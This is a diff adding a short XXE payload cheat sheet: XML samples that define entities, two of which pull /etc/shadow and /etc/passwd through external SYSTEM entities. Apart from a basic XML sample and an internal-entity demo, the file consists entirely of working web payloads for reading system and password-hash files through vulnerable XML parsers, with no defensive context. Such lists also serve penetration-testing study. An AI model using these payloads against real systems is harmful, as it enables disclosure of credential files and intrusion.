@@ -1,0 +1,40 @@
+XXE: Basic XML Example
+
+<!--?xml version="1.0" ?-->
+<userInfo>
+ <firstName>Rahul</firstName>
+ <lastName>Jain</lastName>
+</userInfo>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+XXE: Entity Example
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY test "Doe"> ]>
+ <userInfo>
+  <firstName>Rahul</firstName>
+  <lastName>&test;</lastName>
+ </userInfo>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+XXE: File Disclosure
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY test SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>Rahul</firstName>
+ <lastName>&test;</lastName>
+</userInfo>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+XXE: Local File Inclusion Example
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
